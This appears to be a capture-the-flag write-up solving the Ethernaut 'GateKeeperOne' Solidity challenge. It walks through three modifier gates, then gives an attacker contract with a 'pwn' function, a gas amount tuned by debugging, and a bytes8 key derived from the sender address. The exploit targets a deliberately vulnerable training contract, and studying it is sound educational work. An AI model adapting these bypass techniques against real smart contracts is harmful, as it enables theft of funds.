## 13. GateKeeperOne
The GateKeeperOne contract contains 3 modifiers, used in the enter function. Each one of these modifiers are challenges to unlock the contract.

### Gate One

```javascript
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
}
```

This simple modifier verify that the sender is not an EOA and is a contract. It means we need to call the enter funtion with a contract call.


### Gate two
```javascript
modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
}
```

This modifier requires the gas left to be a multiple of 8191. To be able to perform this, debugging the contract call with a tool like remix can be useful.
We first need to determine how much gas is used by the contract until the *GAS* call by making a call using this contract and then analysing the stack with the debugging tool :

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GateKeeperOneExploit {
    address public victimContract;

    constructor(address _victimAddress) public {
        victimContract = _victimAddress;
    }

    function pwn(bytes8 _key) public {

        (bool success, bytes memory data) = victimContract.call{gas: 4000000}(
            abi.encodeWithSignature("enter(bytes8)", _key)
        );
        require(success);
    }

}
```

![GateKeeperOneExploit test call on remix](https://i.imgur.com/19mhU1A.png)

![Debugging to find how much gas is used by the contract until gasleft function](https://i.imgur.com/1gumyiV.png)

We can see that the *gasleft()* function returns 0x3d0802, so 3999746 in decimal, in the stack. The contract, until the *gasleft()* function, uses 4000000 - 3999746 = **254 gas**.
To know how much gas we need to send to the contract for unlocking the gateTwo modifier, we can use this equation (10 is chosen as multiplier to make sure to have enough gas for the rest of the contract) :
``x - 254 = 10 * 8191`` which gives x = 82164.
Let's change our attacker contract to have the good amount of gas :

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GateKeeperOneExploit {
    address public victimContract;

    constructor(address _victimAddress) public {
        victimContract = _victimAddress;
    }

    function pwn(bytes8 _key) public {

        (bool success, bytes memory data) = victimContract.call{gas: 82164}(
            abi.encodeWithSignature("enter(bytes8)", _key)
        );
        require(success);
    }

}
```

### Gate three
We have to find now the proper bytes8 value to send to the enter(bytes8) function to unlock the third modifier.
We have 3 conditions :

```javascript
modifier gateThree(bytes8 _gateKey) {
  require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
  require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
  require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
_;
  }
```

The third one indicates that ``uint32(uint64(_gateKey))`` must be equal to ``uint16(tx.origin)``, which is the best hint to find the key.
We have to send our address as parameter, but modified to fit the conditions. Using the uint conversions conventions (https://www.tutorialspoint.com/solidity/solidity_conversions.htm), we can deduct the key, considering that our sender address is 0x5B38Da6a701c568545dCfcB0**3FcB875f56beddC4** : 0x3FcB875f0000ddC4.

| Expression               | Value      | Comparator | Expression               | Value              |
|--------------------------|------------|:----------:|--------------------------|--------------------|
| uint32(uint64(\_gateKey)) | 0x0000ddC4 |     ==     | uint16(uint64(_gateKey)) | 0xddC4             |
| uint32(uint64(\_gateKey)) | 0x0000ddC4 |     !=     | uint64(\_gateKey)         | 0x3FcB875f0000ddC4 |
| uint32(uint64(\_gateKey)) | 0x0000ddC4 |     ==     | uint16(tx.origin)        | 0xddC4             |

We can call the *pwn(bytes8)* function of our contract with this key.